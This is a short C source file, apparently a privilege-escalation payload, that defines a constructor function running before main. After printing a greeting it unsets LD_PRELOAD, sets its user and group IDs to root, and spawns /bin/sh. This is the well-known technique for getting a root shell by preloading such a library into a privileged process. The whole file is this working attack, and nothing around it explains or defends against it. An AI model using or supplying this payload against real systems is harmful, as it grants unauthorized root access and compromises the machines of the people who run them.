#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

static void before_main(void) __attribute__((constructor));

static void before_main(void)
{
    write(1, "Hello: World!\n", 14);
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}